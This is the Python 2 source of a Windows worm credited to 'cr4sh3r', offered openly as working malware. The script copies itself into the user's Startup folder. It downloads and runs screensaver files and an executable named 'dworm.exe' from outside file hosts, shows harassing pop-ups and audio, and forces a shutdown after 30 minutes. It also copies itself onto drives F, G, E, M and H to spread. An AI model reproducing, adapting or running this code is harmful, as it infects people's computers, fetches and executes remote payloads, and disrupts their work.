#! python2
# Made by cr4sh3r
# uh3u3hu3h3u

import wget, time, os, random, getpass, ctypes, urllib, base64
from Tkinter import *


def checkex():

    global ft
    cd = os.getcwd()
    global  quest
    quest = getpass.getuser()
    startxa = "C:\Users"  + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    start = "\"C:\Users"  + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
    global filen
    filen = "\"" + sys.argv[0] + "\""

    if cd == startxa:
        ft = False
        payloads()

    else:
        ft = True
        startupcom = "copy " +  filen + " " + start
        os.system(startupcom)
        time.sleep(5)
        dn()

def dn():
    # Necessary files
    global  disf
    disf = "\"C:\Users" + "\\" + quest + "\Documents\""

    wget.download("http://download1499.mediafire.com/4idbxxf5qpxg/3u2ps3idmsh3tgw/bambams.scr")
    os.system("move bambams.scr " + disf)
    time.sleep(1)

    wget.download("http://download1639.mediafire.com/8g6qmhu5ud2g/wbgvv3ba751hdis/jajas.scr")
    os.system("move jajas.scr " +  disf)
    time.sleep(1)

    wget.download("http://download1496.mediafire.com/rnww1w81kzzg/14q3n14sqmh3kwn/xavs.scr")
    os.system("move xavs.scr " + disf)
    time.sleep(1)

    wget.download("http://download1646.mediafire.com/h1bwlb2qhtug/olsf4puxnwq0ax8/jcs.wav")
    os.system("move jcs.wav " + disf)
    time.sleep(1)

    wget.download("http://zepikao.my3gb.com/Sh3lz/dworm.exe")
    os.system("move dworm.exe " + disf)
    time.sleep(1)

    payloads()

def payloads():

    global disd
    global nec
    nec = False
    disd = "C:\Users" + "\\" + quest + "\Documents\\"

    def jc():
        try:
            ctypes.windll.user32.MessageBoxA(0, "Guess who is back", "JC", 1)
            os.system("start " + disd + "jcs.wav")
            time.sleep(35)
        except:
            pass

    def scsa():
        os.system("start " + disd + "dworm.exe")
        nec = True

    def poo():
        time.sleep(10)
        root = Tk()
        root.title("666")
        root.geometry("450x350+100+100")
        n1_v2 = random.choice(["http://i.imgur.com/itvNpzx.gif", "http://i.imgur.com/wHNp0Rp.gif", "http://i.imgur.com/KmXgdak.gif", "http://i.imgur.com/nzeIAYZ.gif", "http://i.imgur.com/seCwEkV.gif", "http://i.imgur.com/EPwPjpP.gif", "http://i.imgur.com/wFRYqlD.gif", "http://i.imgur.com/Li7Swkp.gif", "http://i.imgur.com/FvcyIC2.gif", "http://i.imgur.com/IYNPEIx.gif", "http://i.imgur.com/HeBcQpe.gif", "http://i.imgur.com/11A3xjH.gif", "http://i.imgur.com/kgQ72MW.gif", "http://i.imgur.com/15Zvi4w.gif", "http://i.imgur.com/oNV1PFv.gif", "http://i.imgur.com/JAbUzsA.gif", "http://i.imgur.com/IjrBSha.gif", "http://i.imgur.com/E4PTe4f.gif", "http://i.imgur.com/sc13tyh.jpg", "http://i.imgur.com/PGSolEL.gif"])
        URL = n1_v2
        a = urllib.urlopen(URL)
        raw_input = a.read()
        a.close()
        b = base64.encodestring(raw_input)
        image = PhotoImage(data=b)
        label = Label(image=image)
        label.pack()
        root.mainloop()

    def shut():
        time.sleep(1800)
        os.system("shutdown /s")

    while 1==1:
        try:
            pcho = random.choice([1,2,3,4])

            if pcho   == 1:
                jc()
            elif pcho == 2:
                scsa()
            elif pcho == 3:
                poo()
            elif pcho == 4:
                shut()
        except:
            pass

        for i in range(1):
            pcho = random.choice([1,2,3,4])

        dl = ['F','G','E','M','H']
        def cpy(driveLetter):
            if os.system("cd " + driveLetter + ":") == 0:
                os.system("copy " + filen + " " + driveLetter + ":\\")
            else:
                pass

        for d in range(5):
            try:
                cpy(dl[d])
            except:
                pass


    time.sleep(15)


checkex()





